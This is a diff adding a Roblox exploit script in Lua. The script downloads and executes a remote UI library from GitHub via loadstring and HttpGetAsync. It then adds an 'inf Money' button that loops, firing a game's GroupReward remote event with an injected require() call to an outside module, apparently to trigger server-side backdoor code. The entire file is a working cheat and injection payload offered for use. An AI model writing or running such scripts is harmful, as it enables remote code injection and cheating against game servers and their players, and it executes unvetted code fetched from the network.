@@ -1,0 +1,29 @@
+local lib = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/hooaczx/Script/main/Home%20Ui%20library"))()
+local main = lib:Init()
+
+local Home = main:CreateTab("Home")
+local Misc = main:CreateTab("Misc", "rbxassetid://3192519002")
+
+Misc:CreateLabel("Script", false)
+
+Misc:CreateButton("inf Money", function()
+_G.H = true
+while _G.H do wait()
+wait(0.1)
+local ohString1 = "cGlja2V0dA=="
+local ohString2 = "require(12371119800).tntmastergui('nil', true) -- "
+
+game:GetService("ReplicatedStorage").Events.GroupReward:FireServer(ohString1, ohString2)
+end
+end) 
+
+Misc:CreateButton("turn off inf Money", function()
+_G.H = false
+while _G.H do wait()
+wait(0.1)
+local ohString1 = "cGlja2V0dA=="
+local ohString2 = "require(12371119800).tntmastergui('nil', true) -- "
+
+game:GetService("ReplicatedStorage").Events.GroupReward:FireServer(ohString1, ohString2)
+end
+end) 
